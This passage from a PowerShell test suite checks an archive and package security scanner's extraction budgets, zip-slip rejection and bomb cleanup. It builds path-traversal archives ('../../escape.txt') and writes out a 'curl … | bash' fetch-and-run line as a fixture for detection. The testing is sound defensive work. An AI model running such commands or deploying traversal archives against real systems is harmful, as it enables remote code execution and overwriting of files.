            # returns @() when StagingPath is null (see PipAudit.ps1); this
            # finding only fires once StagingPath is confirmed set.
            @($wheelUnit.Findings | Where-Object { $_.TestID -eq 'MTS-PIPAUDIT-UNAVAIL' }).Count | Should -Be 1
        } finally {
            $script:ArchiveTreeMaxMembers = $origMaxMembers
            $script:ArchiveTreeMaxBytes   = $origMaxBytes
            Remove-Item $srcDir, $out2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ─────────────────────────────────────────────────────────────────────────────
# Third Codex review on PR #37 (commit 06a207b): the SAME root problem in two
# more places -- extraction still happened before budget enforcement.
# ─────────────────────────────────────────────────────────────────────────────

Describe 'Tarball extraction — streamed with per-entry budget enforcement (review follow-up 3, #1)' {
    # The BUG: tar was bulk-extracted (`tar -xzf` / Python tarfile.extractall()),
    # writing EVERY entry before returning control -- a highly-compressible
    # tarball could consume unbounded disk before any budget accounting ever
    # ran. multi_member.tgz's 3 entries (1000/2000/3000 real bytes each,
    # ~168 compressed TOTAL via gzip) make that gap concrete: its on-disk size
    # gives no hint of what it actually writes.
    BeforeAll {
        $script:MultiTar = Join-Path $script:ArcMemDir 'multi_member.tgz'
    }

    It 'extracts every entry when the budget comfortably fits (baseline)' {
        $stage = Join-Path $env:TEMP "mts-p5r1-full-$(Get-Random)"
        try {
            $budget = New-ArchiveTreeBudget
            $r = Expand-SubmissionArchive -InputFile $script:MultiTar -OutputDir $stage -Budget $budget
            $r.Success | Should -BeTrue
            @(Get-ChildItem -LiteralPath $stage -File -Recurse).Count | Should -Be 3
            # Streaming extraction reads $Budget for look-ahead headroom but
            # never writes to it (review follow-up 4) -- Invoke-ArchiveMemberDispatch
            # is the sole authoritative charging point once these members are walked.
            $budget.ExpandedBytes | Should -Be 0
            @($r.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 0
        } finally { Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue }
    }

    It 'stops mid-stream once the budget is reached -- LATER entries are never written' {
        $stage = Join-Path $env:TEMP "mts-p5r1-partial-$(Get-Random)"
        try {
            $budget = New-ArchiveTreeBudget
            $budget.MaxBytes = 2500   # room for file1 (1000) + file2 (2000) is 3000 -- too much;
                                      # room for file1 alone (1000) is comfortable; file2 (2000 more,
                                      # cumulative 3000) exceeds 2500 -- extraction must stop AT file2.
            $r = Expand-SubmissionArchive -InputFile $script:MultiTar -OutputDir $stage -Budget $budget
            $r.Success | Should -BeTrue   # stopping early is normal, not an error
            $extracted = @(Get-ChildItem -LiteralPath $stage -File -Recurse)
            $extracted.Count | Should -Be 1
            $extracted[0].Name | Should -Be 'file1.bin'
            # Decisive proof file2/file3 were NEVER WRITTEN (not written-then-
            # deleted) -- the directory has exactly the one file, nothing else.
            # $budget itself stays untouched -- streaming only reads it (see above).
            $budget.ExpandedBytes | Should -Be 0
            @($r.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 1
        } finally { Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue }
    }

    It 'writes NOTHING when the budget has no room at all' {
        $stage = Join-Path $env:TEMP "mts-p5r1-none-$(Get-Random)"
        try {
            $budget = New-ArchiveTreeBudget
            $budget.MaxBytes = 0
            $r = Expand-SubmissionArchive -InputFile $script:MultiTar -OutputDir $stage -Budget $budget
            $r.Success | Should -BeTrue
            @(Get-ChildItem -LiteralPath $stage -File -Recurse -ErrorAction SilentlyContinue).Count | Should -Be 0
            $budget.ExpandedBytes | Should -Be 0
        } finally { Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue }
    }

    It 'is unbounded when no budget is supplied (direct callers unaffected)' {
        $stage = Join-Path $env:TEMP "mts-p5r1-nobudget-$(Get-Random)"
        try {
            $r = Expand-SubmissionArchive -InputFile $script:MultiTar -OutputDir $stage
            $r.Success | Should -BeTrue
            @(Get-ChildItem -LiteralPath $stage -File -Recurse).Count | Should -Be 3
        } finally { Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue }
    }

    It 'still rejects a path-traversal entry in a tarball' {
        # Regression: the rewrite must keep tar's existing zip-slip protection.
        $tmpDir = Join-Path $env:TEMP "mts-p5r1-trav-$(Get-Random)"
        New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
        $tarPath = Join-Path $tmpDir 'traversal.tgz'
        # Build a traversal tarball directly with .NET -- no Python dependency.
        $fileStream = [System.IO.File]::Create($tarPath)
        $gzipStream = [System.IO.Compression.GZipStream]::new($fileStream, [System.IO.Compression.CompressionMode]::Compress)
        $tarWriter  = [System.Formats.Tar.TarWriter]::new($gzipStream)
        try {
            $entry = [System.Formats.Tar.PaxTarEntry]::new([System.Formats.Tar.TarEntryType]::RegularFile, '../../escape.txt')
            $entry.DataStream = [System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes('pwned'))
            $tarWriter.WriteEntry($entry)
        } finally { $tarWriter.Dispose(); $gzipStream.Dispose(); $fileStream.Dispose() }

        $stage = Join-Path $env:TEMP "mts-p5r1-trav-stage-$(Get-Random)"
        try {
            $r = Expand-SubmissionArchive -InputFile $tarPath -OutputDir $stage -Budget (New-ArchiveTreeBudget)
            $r.Success | Should -BeFalse
            @($r.Findings | Where-Object { $_.TestID -eq 'MTS-EXTRACT-TRAVERSAL' }).Count | Should -Be 1
            @(Get-ChildItem -LiteralPath $stage -File -Recurse -ErrorAction SilentlyContinue).Count | Should -Be 0
        } finally {
            Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'still extracts a real submitted tarball end-to-end through the full engine (regression)' {
        # The one existing functional test that depends on tar extraction
        # actually working end-to-end, re-affirmed here for this fix's own
        # test suite: Npm.Tests.ps1 already covers this via the full pipeline.
        $r = ScanDir 'npm/tarball'
        $u = $r.Units | Where-Object { $_.Name -like '*.tgz' }
        @($u.Findings | Where-Object { $_.TestID -eq 'NPM-LIFECYCLE-SCRIPT' }).Count | Should -BeGreaterThan 0
    }
}

Describe 'Archive-member dispatch — streamed tar extraction does not double-charge the shared budget (review follow-up 4)' {
    # The BUG: Expand-TarArchive charged $Budget.MemberCount/$Budget.ExpandedBytes
    # for every entry AS IT STREAMED THEM TO DISK. Invoke-ArchiveMemberDispatch's
    # own member loop then charged the SAME extracted files AGAIN when it walked
    # the tar's StagingPath for dispatch. A tarball at (or near) MaxMembers had
    # its budget exhausted by the extraction-time charge alone, so dispatch's
    # look-ahead check saw no headroom left and skipped members that were
    # already safely on disk -- under-analyzing content the configured limits
    # were meant to allow.
    BeforeAll {
        $script:P6r1Tar = Join-Path $script:ArcMemDir 'multi_member.tgz'
    }

    It 'fully dispatches a tarball at exactly MaxMembers -- streaming and dispatch must not double-charge the same entries' {
        $stage = Join-Path $env:TEMP "mts-p6r1-$(Get-Random)"
        New-Item -ItemType Directory -Path $stage -Force | Out-Null
        try {
            $context = [PSCustomObject]@{
                Tools = @{}; Venv = $null; Mode = 'offline'; WorkDir = $stage
                ReportsDir = $script:Out; HelperDir = ''; TimeoutSeconds = 60; AdvisoryDbDate = $null
            }
            $enabled = @((Import-AnalyzerRegistry -AnalyzerDir $script:Analyzers) | Where-Object { $_.DefaultEnabled })

            $budget = New-ArchiveTreeBudget
            $budget.MaxMembers = 3   # exactly multi_member.tgz's entry count -- no slack

            $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'multi_member.tgz'; Path = $script:P6r1Tar
                                        RelativePath = 'multi_member.tgz'; StagingPath = $null }
            Expand-UnitInPlace -Unit $unit -Context $context -Budget $budget | Out-Null
            $unit.StagingPath | Should -Not -BeNullOrEmpty
            # All 3 entries actually landed on disk -- extraction itself wasn't
            # the thing that was short-changed.
            @(Get-ChildItem -LiteralPath $unit.StagingPath -File -Recurse).Count | Should -Be 3

            $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $context `
                -Enabled $enabled -Budget $budget -Depth 1

            # Double-charging would have left MemberCount at 3 (or more) BEFORE
            # dispatch's loop even ran a single iteration, tripping its
            # "count >= max" gate on the very first member. Single, correct
            # charging lands MemberCount at exactly 3 -- once per file, by
            # dispatch alone.
            $budget.MemberCount | Should -Be 3
            @($findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 0
        } finally { Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

Describe 'Archive-member dispatch — semantic-container budget check is pre-hoc, not post-hoc (review follow-up 3, #2)' {
    BeforeAll {
        $script:P5r2Stage = Join-Path $env:TEMP "mts-p5r2-stage-$(Get-Random)"
        $script:P5r2Extraction = Expand-SubmissionArchive `
            -InputFile (Join-Path $script:ArcMemDir 'nested_wheel.zip') -OutputDir $script:P5r2Stage
        $script:P5r2Context = [PSCustomObject]@{
            Tools = @{}; Venv = $null; Mode = 'offline'; WorkDir = (Join-Path $env:TEMP "mts-p5r2-work-$(Get-Random)")
            ReportsDir = $script:Out; HelperDir = ''; TimeoutSeconds = 60; AdvisoryDbDate = $null
        }
        New-Item -ItemType Directory -Path $script:P5r2Context.WorkDir -Force | Out-Null
        $script:P5r2Enabled = @((Import-AnalyzerRegistry -AnalyzerDir $script:Analyzers) |
            Where-Object { $_.DefaultEnabled })
    }
    AfterAll {
        Remove-Item $script:P5r2Stage -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $script:P5r2Context.WorkDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    It 'never extracts a nested wheel whose estimated size would exceed remaining headroom' {
        # The BUG: a nested wheel/.nupkg was expanded FIRST via Expand-UnitInPlace,
        # then measured and charged AFTER the fact -- there was no gate at all,
        # so it always extracted regardless of budget, potentially overshooting
        # by up to the per-archive ZIP cap (512MB) with no finding to show for
        # it. Fixed: the SAME central-directory estimate used for a generic
        # archive is read for a semantic container BEFORE Expand-UnitInPlace
        # runs, and extraction is skipped entirely if it wouldn't fit.
        $wheelPath = @(Get-ChildItem -LiteralPath $script:P5r2Extraction.StagingPath -Filter '*.whl' -Recurse)[0].FullName
        $estimate = Get-ArchiveExpansionEstimate -Path $wheelPath
        $estimate | Should -Not -BeNullOrEmpty
        $compressedWheelSize = (Get-Item $wheelPath).Length

        $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'nested_wheel.zip'; Path = 'nested_wheel.zip'
                                    RelativePath = 'nested_wheel.zip'; StagingPath = $script:P5r2Extraction.StagingPath }
        $budget = New-ArchiveTreeBudget
        # Enough room for the PRE-EXISTING per-member pre-charge (the wheel's
        # own compressed-file size, charged unconditionally for any accepted
        # member before this fix's gate even runs) but one byte short of ALSO
        # fitting its estimated expanded content -- isolates THIS gate from
        # the older, generic per-member budget check.
        $budget.MaxBytes = $compressedWheelSize + $estimate.Bytes - 1
        $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $script:P5r2Context `
            -Enabled $script:P5r2Enabled -Budget $budget -Depth 1

        $blocked = @($findings | Where-Object {
            $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' -and $_.File -eq 'nested_wheel.zip!bundled.whl' })
        $blocked.Count | Should -Be 1

        # Decisive proof extraction never even started: NextStageIndex (claimed
        # by Expand-UnitInPlace every time it actually runs) stayed at 0.
        $budget.NextStageIndex | Should -Be 0
        # Only the generic per-member pre-charge (the wheel's own compressed
        # size) landed -- this fix's gate blocks BEFORE adding the estimate,
        # so the total must stop there, not silently include it anyway.
        $budget.ExpandedBytes | Should -Be $compressedWheelSize
    }

    It 'charges the ESTIMATE before extraction when it DOES fit, not the measured size after' {
        $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'nested_wheel.zip'; Path = 'nested_wheel.zip'
                                    RelativePath = 'nested_wheel.zip'; StagingPath = $script:P5r2Extraction.StagingPath }
        $budget = New-ArchiveTreeBudget
        Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $script:P5r2Context `
            -Enabled $script:P5r2Enabled -Budget $budget -Depth 1 | Out-Null

        # The wheel WAS extracted this time (fits comfortably) -- confirm the
        # charge matches the pre-extraction estimate exactly (not a smaller or
        # larger post-hoc measurement -- a ZIP central directory's reported
        # size and the real extracted size are the same number, but WHICH one
        # was actually used matters for the invariant this fix restores: never
        # charge after a write that already happened).
        $wheelPath = @(Get-ChildItem -LiteralPath $script:P5r2Extraction.StagingPath -Filter '*.whl' -Recurse)[0].FullName
        $estimate = Get-ArchiveExpansionEstimate -Path $wheelPath
        $compressedWheelSize = (Get-Item $wheelPath).Length
        $budget.ExpandedBytes | Should -Be ($compressedWheelSize + $estimate.Bytes)
        $budget.NextStageIndex | Should -Be 1   # it WAS extracted
    }

    It 'still extracts a nested wheel that is the LAST admitted member, even though MemberCount is already at MaxMembers (review follow-up 5, #2)' {
        # The BUG: a semantic container is never member-dispatched, so its
        # internal entries never consume Budget.MemberCount -- only its
        # estimated BYTES get charged. But the look-ahead gate applied the
        # SAME count check a generic (recursed) archive needs, so a semantic
        # container that happened to be the parent's LAST admitted member
        # (MemberCount already == MaxMembers, from the unconditional per-
        # member pre-charge above) was blocked purely on a count that was
        # never actually going to be consumed -- order-dependent loss of
        # Python/NuGet coverage. Plenty of byte headroom here isolates the
        # count check specifically.
        $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'nested_wheel.zip'; Path = 'nested_wheel.zip'
                                    RelativePath = 'nested_wheel.zip'; StagingPath = $script:P5r2Extraction.StagingPath }
        $budget = New-ArchiveTreeBudget
        $budget.MaxMembers = 1     # after this member's own pre-charge, MemberCount == MaxMembers == 1
        $budget.MaxBytes   = 100MB # comfortable -- only the COUNT look-ahead is in question here
        $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $script:P5r2Context `
            -Enabled $script:P5r2Enabled -Budget $budget -Depth 1

        @($findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 0
        $budget.NextStageIndex | Should -Be 1   # it WAS extracted, not blocked
    }
}

Describe 'Tarball extraction — partial content cleaned up on a mid-stream failure (review follow-up 5, #1)' {
    It 'removes already-written entries when the aggregate size cap trips partway through' {
        # The BUG: a HARD-block (traversal/bomb/entry-count cap) or a stream
        # error can fire after EARLIER entries in the SAME tarball were
        # already written -- streaming extraction has no "inspect first, then
        # extract" phase the way ZIP's central-directory precheck does.
        # Leaving that partial content behind wastes disk AND is never
        # charged against the budget (StagingPath is never set on failure),
        # so repeated crafted tarballs can each leave more leftovers.
        # multi_member.tgz's entries are 1000/2000/3000 real bytes -- a cap
        # of 2500 lets file1 (1000) write, then trips on file2 (+2000=3000).
        $origMax = $script:MaxTotalUncompressed
        $stage = Join-Path $env:TEMP "mts-p7r1-$(Get-Random)"
        try {
            $script:MaxTotalUncompressed = 2500
            $r = Expand-SubmissionArchive -InputFile (Join-Path $script:ArcMemDir 'multi_member.tgz') -OutputDir $stage
            $r.Success | Should -BeFalse
            @($r.Findings | Where-Object { $_.TestID -eq 'MTS-EXTRACT-BOMB' }).Count | Should -Be 1
            # Decisive proof: file1 WAS written before the cap tripped on
            # file2 -- exactly what leaves partial content without the fix --
            # yet nothing remains in the staging directory afterward.
            @(Get-ChildItem -LiteralPath $stage -Recurse -File -ErrorAction SilentlyContinue).Count | Should -Be 0
        } finally {
            $script:MaxTotalUncompressed = $origMax
            Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Archive-tree budget — directory entries excluded from the ZIP expansion estimate (review follow-up 5, #3)' {
    It 'counts only file entries, not the directory entries the same tree produces' {
        # The BUG: the ZIP central-directory read counted every entry,
        # including explicit directory entries. Invoke-ArchiveMemberDispatch
        # uses Get-ChildItem -File, which never charges a directory to
        # MemberCount -- a ZIP with N files and N matching directory entries
        # estimated 2N and could be rejected even though only N members would
        # ever actually be charged.
        $zipPath = Join-Path $env:TEMP "mts-p7r3-$(Get-Random).zip"
        try {
            $fs = [System.IO.File]::Create($zipPath)
            $za = [System.IO.Compression.ZipArchive]::new($fs, [System.IO.Compression.ZipArchiveMode]::Create)
            try {
                foreach ($i in 1..3) {
                    $za.CreateEntry("dir$i/") | Out-Null   # explicit directory entry -- FullName ends '/'
                    $fileEntry = $za.CreateEntry("dir$i/file$i.txt")
                    $sw = [System.IO.StreamWriter]::new($fileEntry.Open())
                    try { $sw.Write("hello $i") } finally { $sw.Close() }
                }
            } finally { $za.Dispose(); $fs.Dispose() }

            $estimate = Get-ArchiveExpansionEstimate -Path $zipPath
            $estimate | Should -Not -BeNullOrEmpty
            $estimate.Count | Should -Be 3   # not 6 -- the 3 directory entries must not be counted
        } finally {
            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Archive-member dispatch — phantom-byte precharge rolled back on failed expansion (review follow-up 5, #4)' {
    It 'rolls back the semantic-container byte precharge when extraction fails (zip-slip guard)' {
        # The BUG: a nested semantic container's estimated size is precharged
        # to Budget.ExpandedBytes BEFORE Expand-UnitInPlace runs (review
        # follow-up 3). If extraction subsequently fails (zip-slip guard,
        # bomb/ratio guard, ...), nothing was ever written to disk, but the
        # precharge stayed -- a crafted, always-rejected container could
        # exhaust the shared byte budget with phantom bytes and no content to
        # show for it.
        $stageParent = Join-Path $env:TEMP "mts-p7r4-parent-$(Get-Random)"
        $workDir     = Join-Path $env:TEMP "mts-p7r4-work-$(Get-Random)"
        New-Item -ItemType Directory -Path $stageParent -Force | Out-Null
        New-Item -ItemType Directory -Path $workDir -Force | Out-Null
        try {
            $evilWhl = Join-Path $stageParent 'evil.whl'
            $fs = [System.IO.File]::Create($evilWhl)
            $za = [System.IO.Compression.ZipArchive]::new($fs, [System.IO.Compression.ZipArchiveMode]::Create)
            try {
                $e = $za.CreateEntry('../../escape.txt')
                $sw = [System.IO.StreamWriter]::new($e.Open())
                try { $sw.Write('pwned') } finally { $sw.Close() }
            } finally { $za.Dispose(); $fs.Dispose() }

            $context = [PSCustomObject]@{
                Tools = @{}; Venv = $null; Mode = 'offline'; WorkDir = $workDir
                ReportsDir = $script:Out; HelperDir = ''; TimeoutSeconds = 60; AdvisoryDbDate = $null
            }
            $enabled = @((Import-AnalyzerRegistry -AnalyzerDir $script:Analyzers) | Where-Object { $_.DefaultEnabled })

            $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'container.zip'; Path = 'container.zip'
                                        RelativePath = 'container.zip'; StagingPath = $stageParent }
            $budget = New-ArchiveTreeBudget

            $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $context `
                -Enabled $enabled -Budget $budget -Depth 1

            # The traversal guard blocked extraction -- nothing was written.
            @($findings | Where-Object { $_.TestID -eq 'MTS-EXTRACT-TRAVERSAL' }).Count | Should -Be 1
            # Decisive proof: only the unconditional per-member pre-charge
            # (evil.whl's own compressed file size, charged for any admitted
            # member regardless of type) remains -- the separate pre-
            # extraction byte ESTIMATE, charged before Expand-UnitInPlace ran,
            # must have been rolled back once extraction actually failed.
            $compressedSize = (Get-Item $evilWhl).Length
            $budget.ExpandedBytes | Should -Be $compressedSize
        } finally {
            Remove-Item $stageParent -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Invoke-Scan — staging root survives an 8.3 short-name $env:TEMP (review follow-up 5, #5)' {
    It 'does not truncate archive-member inner paths when $env:TEMP resolves through an 8.3 short name' {
        # The BUG (CI-only failures that never reproduced locally across
        # several rounds): $stagingRoot was built directly from $env:TEMP and
        # used verbatim as the prefix for $file.FullName.Substring(...)
        # everywhere in Invoke-ArchiveMemberDispatch. On a host where
        # $env:TEMP resolves through an 8.3 short name (confirmed on GitHub
        # Actions windows-latest runners: C:\Users\RUNNER~1\... for
        # C:\Users\runneradmin\...), Get-ChildItem's FullName -- which always
        # reports the LONG form when it enumerates -- no longer shares a
        # character-for-character prefix with StagingPath, silently
        # truncating the inner path by the length difference and swallowing
        # the tail of the archive's own staging-dir name (e.g. "zip", "tgz")
        # into what should have been the member's inner path alone.
        #
        # Reproduced here without needing an actual CI runner: build a
        # deliberately long-named directory (long enough that NTFS assigns it
        # an 8.3 alias -- true on every Windows host that hasn't disabled
        # short-name generation entirely, not just CI's) and point $env:TEMP
        # at it for the duration of one Invoke-Scan call.
        $fso = New-Object -ComObject Scripting.FileSystemObject
        $fakeTempLong = Join-Path $env:TEMP "mts-fake-temp-profile-longname-$(Get-Random)"
        New-Item -ItemType Directory -Path $fakeTempLong -Force | Out-Null
        $fakeTempShort = $fso.GetFolder($fakeTempLong).ShortPath

        if ($fakeTempShort -eq $fakeTempLong) {
            Remove-Item -LiteralPath $fakeTempLong -Recurse -Force -ErrorAction SilentlyContinue
            Set-ItResult -Skipped -Because '8.3 short-name generation is disabled on this volume -- cannot reproduce the triggering condition here.'
            return
        }

        $origTemp = $env:TEMP
        try {
            $env:TEMP = $fakeTempShort
            $out = Join-Path $fakeTempLong 'out'
            New-Item -ItemType Directory -Path $out -Force | Out-Null

            $r = Invoke-Scan -Path $script:ArcMemDir -Profile core `
                -AnalyzerDir $script:Analyzers -ReportsDir $out -Mode offline
            $u = $r.Units | Where-Object { $_.Name -eq 'two_level_nested.zip' }
            $hit = @($u.Findings | Where-Object { $_.TestID -eq 'SHELL-B64-EXEC' })
            $hit.Count | Should -Be 1
            $hit[0].File | Should -Be "two_level_nested.zip!inner.zip!deep${script:S}risky.sh"
        } finally {
            $env:TEMP = $origTemp
            Remove-Item -LiteralPath $fakeTempLong -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Invoke-Scan — cumulative budget for top-level semantic containers (review follow-up 5, #6)' {
    It 'blocks a later top-level wheel once earlier ones have used up the semantic-container budget, without starving the first' {
        # The BUG: a top-level semantic container (wheel/egg/.nupkg) always
        # extracts regardless of the shared archive-tree budget -- by design,
        # since blocking it because an UNRELATED earlier generic archive used
        # up the budget would silently break Python/NuGet coverage (review
        # follow-up 2, #4). But with NO bound on this category at all, many
        # top-level wheels/eggs/.nupkg files -- each individually allowed up
        # to the 512MB per-archive decompression-bomb cap -- could
        # cumulatively exhaust disk with no run-wide limit.
        $tmpDir = Join-Path $env:TEMP "mts-p8r1-$(Get-Random)"
        New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
        $out = Join-Path $env:TEMP "mts-p8r1-out-$(Get-Random)"
        $wheelSrc = Join-Path $script:Corpus 'python/clean_pkg-1.0-py3-none-any.whl'
        Copy-Item -LiteralPath $wheelSrc -Destination (Join-Path $tmpDir 'pkg_a.whl')
        Copy-Item -LiteralPath $wheelSrc -Destination (Join-Path $tmpDir 'pkg_b.whl')

        $estimate = Get-ArchiveExpansionEstimate -Path (Join-Path $tmpDir 'pkg_a.whl')
        $estimate | Should -Not -BeNullOrEmpty
        $origMaxBytes = $script:ArchiveTreeMaxBytes
        try {
            # Room for ONE wheel's estimated expansion, not two.
            $script:ArchiveTreeMaxBytes = $estimate.Bytes + 50
            $r = Invoke-Scan -Path $tmpDir -Profile core -AnalyzerDir $script:Analyzers `
                -ReportsDir $out -Mode offline

            $pkgUnits = @($r.Units | Where-Object { $_.Name -like 'pkg_*.whl' })
            $pkgUnits.Count | Should -Be 2

            $blockedUnits = @($pkgUnits | Where-Object {
                @($_.Findings | Where-Object {
                    $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' -and $_.Issue -match 'semantic-container budget' }).Count -gt 0
            })
            # Exactly one of the two hits the cumulative cap -- proves the
            # bound is enforced -- but never both, since the FIRST admitted
            # one must never be starved by this new gate on its own.
            $blockedUnits.Count | Should -Be 1
            $notBlockedUnits = @($pkgUnits | Where-Object { $_ -notin $blockedUnits })
            $notBlockedUnits.Count | Should -Be 1
        } finally {
            $script:ArchiveTreeMaxBytes = $origMaxBytes
            Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'still extracts a top-level wheel when the shared archive-tree budget starts fully exhausted (no regression)' {
        # Decisive proof the NEW cumulative semantic-container gate is
        # genuinely SEPARATE from the shared archive-tree $budget: the
        # existing guarantee (review follow-up 2, #4) that an unrelated
        # exhausted budget must never starve Python/NuGet coverage must still
        # hold exactly as before.
        $origMaxBytes   = $script:ArchiveTreeMaxBytes
        $origMaxMembers = $script:ArchiveTreeMaxMembers
        $out = Join-Path $env:TEMP "mts-p8r1b-out-$(Get-Random)"
        try {
            $script:ArchiveTreeMaxBytes   = 0
            $script:ArchiveTreeMaxMembers = 0
            $r = Invoke-Scan -Path (Join-Path $script:Corpus 'python') -Profile core `
                -AnalyzerDir $script:Analyzers -ReportsDir $out -Mode offline

            $u = $r.Units | Where-Object { $_.Name -eq 'clean_pkg-1.0-py3-none-any.whl' }
            $u | Should -Not -BeNullOrEmpty
            @($u.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 0
        } finally {
            $script:ArchiveTreeMaxBytes   = $origMaxBytes
            $script:ArchiveTreeMaxMembers = $origMaxMembers
            Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Archive-member dispatch — an oversized member does not block a later smaller one (review follow-up 5, #7)' {
    It 'continues past a member that does not individually fit and still analyzes a later smaller one' {
        # The BUG: hitting the byte cap on ONE member's own size used to
        # `break` out of the ENTIRE remaining loop, treating every member
        # after it as skipped too -- even a much smaller one that would
        # easily have fit within the remaining headroom on its own. An
        # attacker could place one oversized benign member right before a
        # small malicious script to keep that script from ever being
        # analyzed while budget remained.
        $stage = Join-Path $env:TEMP "mts-p8r2-$(Get-Random)"
        $workDir = Join-Path $env:TEMP "mts-p8r2-work-$(Get-Random)"
        New-Item -ItemType Directory -Path $stage -Force | Out-Null
        New-Item -ItemType Directory -Path $workDir -Force | Out-Null
        try {
            [System.IO.File]::WriteAllBytes((Join-Path $stage 'big.bin'), [byte[]]::new(500))
            [System.IO.File]::WriteAllText((Join-Path $stage 'small.sh'),
                "#!/bin/bash`ncurl https://example.test/install.sh | bash`n")

            $context = [PSCustomObject]@{
                Tools = @{}; Venv = $null; Mode = 'offline'; WorkDir = $workDir
                ReportsDir = $script:Out; HelperDir = ''; TimeoutSeconds = 60; AdvisoryDbDate = $null
            }
            $enabled = @((Import-AnalyzerRegistry -AnalyzerDir $script:Analyzers) | Where-Object { $_.DefaultEnabled })
            $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'container.zip'; Path = 'container.zip'
                                        RelativePath = 'container.zip'; StagingPath = $stage }
            $budget = New-ArchiveTreeBudget
            $budget.MaxBytes = 100   # big.bin (500) alone exceeds this; small.sh's own bytes easily fit

            $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $context `
                -Enabled $enabled -Budget $budget -Depth 1

            # big.bin was skipped (too big on its own) -- named in the gap note.
            $gap = @($findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' })
            $gap.Count | Should -Be 1
            $gap[0].Issue | Should -Match 'big\.bin'
            # small.sh was STILL analyzed and flagged -- the loop did not stop
            # at big.bin; only that one oversized member was skipped.
            @($findings | Where-Object {
                $_.TestID -eq 'SHELL-REMOTE-EXEC' -and $_.File -eq 'container.zip!small.sh' }).Count |
                Should -BeGreaterThan 0
        } finally {
            Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe 'Invoke-Scan — top-level semantic-container bytes stay out of the shared archive budget (review follow-up 5, #8)' {
    It 'does not let a preceding top-level wheel starve a later generic archive of shared budget' {
        # The BUG: $budget.TopLevelSemanticBytes (review follow-up 5, #6) was
        # added ALONGSIDE the pre-existing charge to the SHARED
        # $budget.ExpandedBytes, not instead of it -- so a top-level wheel
        # scanned before a generic archive still consumed the shared budget
        # that gates GENERIC archives, making a later archive's coverage
        # depend on filesystem enumeration order despite the whole point of
        # the new counter being independence from this category.
        $tmpDir = Join-Path $env:TEMP "mts-p8r3-$(Get-Random)"
        New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
        $out = Join-Path $env:TEMP "mts-p8r3-out-$(Get-Random)"
        try {
            # Numeric prefixes make discovery/enumeration order deterministic:
            # the wheel is always seen before the generic archive.
            Copy-Item -LiteralPath (Join-Path $script:Corpus 'python/clean_pkg-1.0-py3-none-any.whl') `
                -Destination (Join-Path $tmpDir '01_pkg.whl')
            $zipPath = Join-Path $tmpDir '02_container.zip'
            $fs = [System.IO.File]::Create($zipPath)
            $za = [System.IO.Compression.ZipArchive]::new($fs, [System.IO.Compression.ZipArchiveMode]::Create)
            try {
                $e = $za.CreateEntry('note.txt')
                $sw = [System.IO.StreamWriter]::new($e.Open())
                try { $sw.Write('hello') } finally { $sw.Close() }
            } finally { $za.Dispose(); $fs.Dispose() }

            $wheelEstimate = Get-ArchiveExpansionEstimate -Path (Join-Path $tmpDir '01_pkg.whl')
            $zipEstimate   = Get-ArchiveExpansionEstimate -Path $zipPath
            $wheelEstimate | Should -Not -BeNullOrEmpty
            $zipEstimate   | Should -Not -BeNullOrEmpty

            $origMaxBytes = $script:ArchiveTreeMaxBytes
            try {
                # Comfortable room for the tiny zip alone; nowhere near enough
                # for the wheel's real expanded content on top of it -- proves
                # the wheel's bytes never touch this shared cap.
                $script:ArchiveTreeMaxBytes = $zipEstimate.Bytes + 100
                $r = Invoke-Scan -Path $tmpDir -Profile core -AnalyzerDir $script:Analyzers `
                    -ReportsDir $out -Mode offline

                $zipUnit = $r.Units | Where-Object { $_.Name -eq '02_container.zip' }
                $zipUnit | Should -Not -BeNullOrEmpty
